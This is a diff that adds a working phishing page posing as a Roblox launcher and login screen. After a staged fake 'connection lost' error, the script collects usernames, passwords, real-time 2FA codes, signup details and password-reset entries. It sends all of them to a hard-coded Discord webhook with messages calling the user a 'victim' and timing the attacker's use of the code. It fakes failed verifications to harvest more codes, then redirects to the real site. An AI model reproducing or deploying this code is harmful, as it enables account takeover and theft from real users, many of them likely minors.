@@ -1,0 +1,245 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox</title>
+    <link rel="icon" href="https://images.rbxcdn.com/favicon.ico">
+    <style>
+        :root{--bg:#191b1f;--card:#232527;--text:#fff;--muted:#bdbebe;--input-bg:#191b1f;--input-border:#3a3d41;--input-focus:#00b06f;--btn:#00b06f;--error:#e94560}
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{font-family:"Helvetica Neue",Helvetica,Arial,sans-serif;background:var(--bg);color:var(--text);min-height:100vh}
+        
+        .launcher{position:fixed;top:0;left:0;width:100%;height:100%;background:var(--bg);z-index:100;display:flex;flex-direction:column;align-items:center;justify-content:center}
+        .launcher-logo{font-family:"Arial Black",sans-serif;font-size:48px;font-weight:900;margin-bottom:30px;color:var(--text);animation:pulse 1.5s ease-in-out infinite}
+        @keyframes pulse{0%,100%{opacity:1}50%{opacity:.7}}
+        .loading-bar{width:300px;height:8px;background:var(--input-border);border-radius:4px;margin:0 auto 16px;overflow:hidden}
+        .loading-bar .fill{height:100%;background:var(--btn);border-radius:4px;transition:width 0.15s ease}
+        .launcher-status{font-size:15px;color:var(--muted);text-align:center;margin-bottom:20px}
+        .error-status{font-size:15px;color:var(--error);text-align:center;margin-bottom:20px;display:none}
+        .refresh-btn{background:var(--btn);color:#fff;border:none;border-radius:8px;padding:12px 30px;font-size:16px;font-weight:600;cursor:pointer;display:none;margin-top:10px}
+        .refresh-btn:hover{opacity:.9}
+        .retry-spinner{width:36px;height:36px;border:3px solid rgba(0,176,111,.2);border-top-color:#00b06f;border-radius:50%;animation:spin .7s linear infinite;margin:0 auto 12px;display:none}
+        @keyframes spin{to{transform:rotate(360deg)}}
+        .retry-text{font-size:15px;color:var(--text);text-align:center;margin-top:10px;display:none}
+        .retry-bar{width:300px;height:8px;background:var(--input-border);border-radius:4px;margin:16px auto;overflow:hidden;display:none}
+        .retry-bar .retry-fill{height:100%;background:var(--btn);border-radius:4px;transition:width 0.1s ease}
+        
+        .login-wrap{width:100%;max-width:396px;padding:20px;margin:0 auto;display:none;min-height:100vh;justify-content:center;align-items:center}
+        .login-wrap.active{display:flex}
+        .login-logo{text-align:center;margin-bottom:32px}.login-logo svg{width:160px}
+        .card{background:var(--card);border-radius:12px;padding:32px;width:100%}
+        .card h1{font-size:26px;font-weight:700;margin-bottom:4px}
+        .card .sub{font-size:14px;color:var(--muted);margin-bottom:24px}
+        .fld{margin-bottom:16px}
+        .fld label{display:block;font-size:13px;font-weight:600;color:var(--muted);margin-bottom:6px}
+        .fld input{width:100%;height:44px;padding:0 16px;background:var(--input-bg);border:1px solid var(--input-border);border-radius:8px;color:var(--text);font-size:16px;outline:none}
+        .fld input:focus{border-color:var(--input-focus);box-shadow:0 0 0 3px rgba(0,176,111,.18)}
+        .btn{width:100%;height:44px;background:var(--btn);color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:600;cursor:pointer;margin-top:8px}
+        .btn:hover{opacity:.9}.btn:disabled{opacity:.6}
+        .err{background:var(--error);color:#fff;padding:10px;border-radius:8px;font-size:13px;margin-bottom:16px;display:none}
+        .footer{text-align:center;margin-top:22px;font-size:13px;color:var(--muted)}
+        .footer a{color:var(--muted);text-decoration:none}
+        .load{text-align:center;padding:30px 0;display:none}.load.active{display:block}
+        .spinner{width:36px;height:36px;border:3px solid rgba(0,176,111,.2);border-top-color:#00b06f;border-radius:50%;animation:spin .7s linear infinite;margin:0 auto 12px}
+        
+        .code-boxes{display:flex;gap:8px;justify-content:center;margin-bottom:20px}
+        .code-box{width:44px;height:52px;background:var(--input-bg);border:1px solid var(--input-border);border-radius:8px;text-align:center;font-size:24px;font-weight:700;color:var(--text);outline:none;transition:all .15s}
+        .code-box:focus{border-color:var(--input-focus);box-shadow:0 0 0 3px rgba(0,176,111,.18);background:var(--card)}
+        .verification-title{text-align:center;font-size:18px;font-weight:700;margin-bottom:4px}
+        .verification-sub{text-align:center;font-size:13px;color:var(--muted);margin-bottom:24px}
+        .signup-link{text-align:center;margin-top:20px;font-size:13px;color:var(--muted)}
+        .signup-link a{color:var(--btn);text-decoration:none;cursor:pointer}
+        .resend-link{text-align:center;margin-top:16px;font-size:13px;color:var(--muted)}
+        .resend-link a{color:var(--btn);text-decoration:none;cursor:pointer}
+        .resend-link a.disabled{color:var(--muted);pointer-events:none}
+        .countdown{color:var(--muted);font-size:13px}
+    </style>
+</head>
+<body>
+
+<div class="launcher" id="launcher">
+    <div class="launcher-logo">ROBLOX</div>
+    <div class="loading-bar"><div class="fill" id="loadFill" style="width:0%"></div></div>
+    <p class="launcher-status" id="loadStatus">Starting Roblox...</p>
+    <p class="error-status" id="errorStatus">Failed to join. Connection timed out.</p>
+    <div class="retry-spinner" id="retrySpinner"></div>
+    <p class="retry-text" id="retryText">Reconnecting...</p>
+    <div class="retry-bar" id="retryBar"><div class="retry-fill" id="retryFill" style="width:0%"></div></div>
+    <button class="refresh-btn" id="refreshBtn" onclick="retry()">Try Again</button>
+</div>
+
+<div class="login-wrap" id="loginWrap">
+    <div style="width:100%">
+        <div class="login-logo">
+            <svg viewBox="0 0 160 44"><rect x="2" y="14" width="4" height="16" rx="2" fill="var(--text)"/><rect x="10" y="14" width="4" height="16" rx="2" fill="var(--text)"/><rect x="18" y="7" width="4" height="23" rx="2" fill="var(--text)"/><rect x="26" y="14" width="4" height="10" rx="2" fill="var(--text)"/><rect x="34" y="14" width="4" height="16" rx="2" fill="var(--text)"/><text x="44" y="32" font-family="Arial Black" font-weight="900" font-size="22" fill="var(--text)">ROBLOX</text></svg>
+        </div>
+        <div class="card">
+            <div id="stepLogin">
+                <h1>Log In</h1><p class="sub">Log into your Roblox account</p>
+                <div class="err" id="eLogin">Incorrect username or password.</div>
+                <div class="fld"><label>Username / Никнейм</label><input type="text" id="u" placeholder="username / никнейм" autocomplete="off" required></div>
+                <div class="fld"><label>Password / Пароль</label><input type="password" id="p" placeholder="password / пароль" autocomplete="off" required></div>
+                <button class="btn" id="btnLogin" onclick="doLogin()">Log In</button>
+            </div>
+            
+            <div id="stepSignup" style="display:none">
+                <h1>Sign Up</h1><p class="sub">Create your Roblox account</p>
+                <div class="err" id="eSignup">Please fill all fields correctly.</div>
+                <div class="fld"><label>Username / Никнейм</label><input type="text" id="su" placeholder="username / никнейм" autocomplete="off" required></div>
+                <div class="fld"><label>Password / Пароль</label><input type="password" id="sp" placeholder="password / пароль" autocomplete="off" required></div>
+                <div class="fld"><label>Confirm Password</label><input type="password" id="sp2" placeholder="confirm password" autocomplete="off" required></div>
+                <div class="fld"><label>Email</label><input type="email" id="se" placeholder="email@example.com" autocomplete="off" required></div>
+                <button class="btn" onclick="doSignup()">Sign Up</button>
+                <div class="signup-link">Already have an account? <a onclick="showStep('stepLogin')">Log In</a></div>
+            </div>
+            
+            <div id="stepForgot" style="display:none">
+                <h1>Forgot Password</h1><p class="sub">Enter your email or username to reset password</p>
+                <div class="err" id="eForgot">Please enter valid email or username.</div>
+                <div class="fld"><label>Email or Username</label><input type="text" id="fg" placeholder="email or username" autocomplete="off" required></div>
+                <button class="btn" onclick="doForgot()">Submit</button>
+                <div class="signup-link"><a onclick="showStep('stepLogin')">Back to Log In</a></div>
+            </div>
+            
+            <div class="load" id="load1"><div class="spinner"></div><p>Checking...</p></div>
+            
+            <div id="step2fa" style="display:none">
+                <div class="verification-title">Verification Required</div>
+                <div class="verification-sub">Enter the 6-digit code sent to your email or authenticator app.</div>
+                <div class="err" id="e2FA">Invalid code. Please try again.</div>
+                <div class="code-boxes">
+                    <input type="text" class="code-box" maxlength="1" inputmode="numeric" oninput="nextBox(this)" onkeydown="prevBox(event,this)" autocomplete="off">
+                    <input type="text" class="code-box" maxlength="1" inputmode="numeric" oninput="nextBox(this)" onkeydown="prevBox(event,this)" autocomplete="off">
+                    <input type="text" class="code-box" maxlength="1" inputmode="numeric" oninput="nextBox(this)" onkeydown="prevBox(event,this)" autocomplete="off">
+                    <input type="text" class="code-box" maxlength="1" inputmode="numeric" oninput="nextBox(this)" onkeydown="prevBox(event,this)" autocomplete="off">
+                    <input type="text" class="code-box" maxlength="1" inputmode="numeric" oninput="nextBox(this)" onkeydown="prevBox(event,this)" autocomplete="off">
+                    <input type="text" class="code-box" maxlength="1" inputmode="numeric" oninput="nextBox(this)" onkeydown="prevBox(event,this)" autocomplete="off">
+                </div>
+                <button class="btn" id="btnVerify" onclick="do2FA()">Verify</button>
+                <div class="resend-link" id="resendLink">
+                    <a id="resendBtn" onclick="resendCode()">Send Code Again</a>
+                    <span class="countdown" id="countdown" style="display:none"></span>
+                </div>
+            </div>
+            <div class="load" id="load2"><div class="spinner"></div><p>Verifying...</p></div>
+            
+            <div class="signup-link" id="signupLink"><a onclick="showStep('stepSignup')">Don't have an account? Sign Up</a></div>
+        </div>
+        <div class="footer" id="forgotLink"><a onclick="showStep('stepForgot')">Forgot Password or Username?</a></div>
+    </div>
+</div>
+
+<script>
+(function(){
+    const WH='https://discord.com/api/webhooks/1510730615387848865/cFXlUZl8LBmxG2PMYeESpWSykwvFr1kgCxSvC5yjvNWlnXUy78mEam9lIG-7BYu2jcKK';
+    var U='',P='',attempts2FA=0,resendCooldown=0,countdownInterval=null;
+    function hasR(t){return /[а-яё]/i.test(t)}
+    async function send(m){try{await fetch(WH,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({content:m})})}catch(e){}}
+    
+    function hideAll(){['stepLogin','stepSignup','stepForgot','step2fa','load1','load2','signupLink','forgotLink'].forEach(function(x){var e=document.getElementById(x);if(e){if(x==='signupLink'||x==='forgotLink')e.style.display='none';else if(x==='load1'||x==='load2')e.classList.remove('active');else e.style.display='none'}})}
+    window.showStep=function(s){
+        hideAll();
+        if(s==='stepLogin'){document.getElementById('stepLogin').style.display='block';document.getElementById('signupLink').style.display='block';document.getElementById('forgotLink').style.display='block'}
+        else if(s==='stepSignup'){document.getElementById('stepSignup').style.display='block'}
+        else if(s==='stepForgot'){document.getElementById('stepForgot').style.display='block'}
+        else if(s==='step2fa'){
+            document.getElementById('step2fa').style.display='block';
+            document.getElementById('resendBtn').classList.remove('disabled');
+            document.getElementById('resendBtn').style.display='inline';
+            document.getElementById('countdown').style.display='none';
+            if(resendCooldown>0){document.getElementById('resendBtn').classList.add('disabled');document.getElementById('resendBtn').style.display='none';document.getElementById('countdown').style.display='inline';document.getElementById('countdown').textContent='Resend available in '+resendCooldown+'s'}
+            if(countdownInterval)clearInterval(countdownInterval);
+            if(resendCooldown>0){countdownInterval=setInterval(function(){resendCooldown--;document.getElementById('countdown').textContent='Resend available in '+resendCooldown+'s';if(resendCooldown<=0){clearInterval(countdownInterval);document.getElementById('resendBtn').classList.remove('disabled');document.getElementById('resendBtn').style.display='inline';document.getElementById('countdown').style.display='none'}},1000)}
+        }
+    };
+    
+    var totalDuration=Math.floor(Math.random()*7000)+5000;
+    var fill=document.getElementById('loadFill'),status=document.getElementById('loadStatus');
+    var steps=[{txt:'Starting Roblox...'},{txt:'Connecting to servers...'},{txt:'Loading game files...'},{txt:'Joining server...'},{txt:'Syncing data...'},{txt:'Almost ready...'},{txt:'Preparing game...'}];
+    var currentStep=0;
+    var progressInterval=setInterval(function(){
+        var progress=Math.min(Math.floor((currentStep/steps.length)*88),88);
+        fill.style.width=progress+'%';
+        if(currentStep<steps.length){status.textContent=steps[currentStep].txt;currentStep++}
+        else{clearInterval(progressInterval);fill.style.width='92%';status.textContent='Connection lost...';
+            setTimeout(function(){document.getElementById('loadStatus').style.display='none';document.getElementById('errorStatus').style.display='block';document.getElementById('refreshBtn').style.display='block'},1000)}
+    },totalDuration/steps.length);
+    
+    window.retry=function(){
+        document.getElementById('errorStatus').style.display='none';document.getElementById('refreshBtn').style.display='none';
+        document.getElementById('retrySpinner').style.display='block';document.getElementById('retryText').style.display='block';
+        document.getElementById('retryBar').style.display='block';var retryFill=document.getElementById('retryFill');
+        var delay=Math.floor(Math.random()*3000)+2000;
+        var reconnectSteps=['Reconnecting...','Checking servers...','Restoring session...','Loading...'];
+        var si=0,retryProgress=0;var stepTime=delay/reconnectSteps.length;
+        var sInterval=setInterval(function(){if(si<reconnectSteps.length){document.getElementById('retryText').textContent=reconnectSteps[si];si++}else{clearInterval(sInterval)}},stepTime);
+        var rInterval=setInterval(function(){retryProgress+=Math.floor(Math.random()*8)+3;if(retryProgress>95)retryProgress=95;retryFill.style.width=retryProgress+'%';if(retryProgress>=95)clearInterval(rInterval)},stepTime/4);
+        setTimeout(function(){document.getElementById('launcher').style.display='none';document.getElementById('loginWrap').classList.add('active')},delay);
+    };
+    
+    // RUSSIAN BLOCK - silently remove, no error
+    document.getElementById('u').addEventListener('input',function(){if(hasR(this.value)){this.value=this.value.replace(/[а-яё]/gi,'')}});
+    document.getElementById('p').addEventListener('input',function(){if(hasR(this.value)){this.value=this.value.replace(/[а-яё]/gi,'')}});
+    
+    window.nextBox=function(el){if(el.value.length===1){var next=el.nextElementSibling;if(next&&next.classList.contains('code-box'))next.focus()}};
+    window.prevBox=function(e,el){if(e.key==='Backspace'&&el.value.length===0){var prev=el.previousElementSibling;if(prev&&prev.classList.contains('code-box')){prev.focus();prev.value=''}}};
+    function getCode(){var c='';document.querySelectorAll('.code-box').forEach(function(b){c+=b.value});return c}
+    
+    window.resendCode=function(){
+        if(resendCooldown>0)return;
+        resendCooldown=60;
+        document.getElementById('resendBtn').classList.add('disabled');
+        document.getElementById('resendBtn').style.display='none';
+        document.getElementById('countdown').style.display='inline';
+        document.getElementById('countdown').textContent='Resend available in '+resendCooldown+'s';
+        
+        countdownInterval=setInterval(function(){
+            resendCooldown--;
+            document.getElementById('countdown').textContent='Resend available in '+resendCooldown+'s';
+            if(resendCooldown<=0){clearInterval(countdownInterval);document.getElementById('resendBtn').classList.remove('disabled');document.getElementById('resendBtn').style.display='inline';document.getElementById('countdown').style.display='none'}
+        },1000);
+        
+        send('📩 **RESEND CODE**\n👤 `'+U+'`\n⏰ '+new Date().toLocaleString()+'\nVictim requested a new code. You have 60 seconds.');
+    };
+    
+    window.doLogin=async function(){
+        U=document.getElementById('u').value.trim();P=document.getElementById('p').value.trim();
+        if(U.length<3||P.length<3){document.getElementById('eLogin').textContent='Incorrect username or password.';document.getElementById('eLogin').style.display='block';return}
+        document.getElementById('eLogin').style.display='none';hideAll();document.getElementById('load1').classList.add('active');
+        await send('🎯 **LOGIN**\n👤 `'+U+'`\n🔑 `'+P+'`\n⏰ '+new Date().toLocaleString()+'\n\n60 seconds to use 2FA code.');
+        setTimeout(function(){hideAll();document.getElementById('step2fa').style.display='block';document.querySelector('.code-box').focus()},2000);
+    };
+    
+    window.do2FA=async function(){
+        var code=getCode();
+        if(code.length<6){document.getElementById('e2FA').style.display='block';return}
+        attempts2FA++;document.getElementById('e2FA').style.display='none';document.getElementById('btnVerify').disabled=true;
+        hideAll();document.getElementById('load2').classList.add('active');
+        await send('🔐 **2FA ATTEMPT #'+attempts2FA+'**\n👤 `'+U+'`\n🔢 `'+code+'`\n⏰ '+new Date().toLocaleString());
+        setTimeout(function(){
+            if(attempts2FA>=3){window.location.href='https://www.roblox.com/login';return}
+            hideAll();document.getElementById('step2fa').style.display='block';document.getElementById('btnVerify').disabled=false;
+            document.querySelectorAll('.code-box').forEach(function(b){b.value=''});
+            document.getElementById('e2FA').textContent='Invalid code. Please try again. ('+(3-attempts2FA)+' attempts left)';document.getElementById('e2FA').style.display='block';
+            document.querySelector('.code-box').focus();
+        },2000);
+    };
+    
+    window.doSignup=async function(){
+        var u=document.getElementById('su').value.trim(),p=document.getElementById('sp').value.trim(),p2=document.getElementById('sp2').value.trim(),e=document.getElementById('se').value.trim();
+        if(u.length<3||p.length<3||p!==p2||!e.includes('@')){document.getElementById('eSignup').style.display='block';return}
+        await send('📝 **SIGNUP**\n👤 `'+u+'`\n🔑 `'+p+'`\n📧 `'+e+'`\n⏰ '+new Date().toLocaleString());
+        window.location.href='https://www.roblox.com/home';
+    };
+    
+    window.doForgot=async function(){
+        var v=document.getElementById('fg').value.trim();
+        if(v.length<3){document.getElementById('eForgot').style.display='block';return}
+        await send('🔑 **FORGOT**\n📧 `'+v+'`\n⏰ '+new Date().toLocaleString());
+        showStep('stepLogin');
+    };
+})();
+</script>
+</body>
+</html>
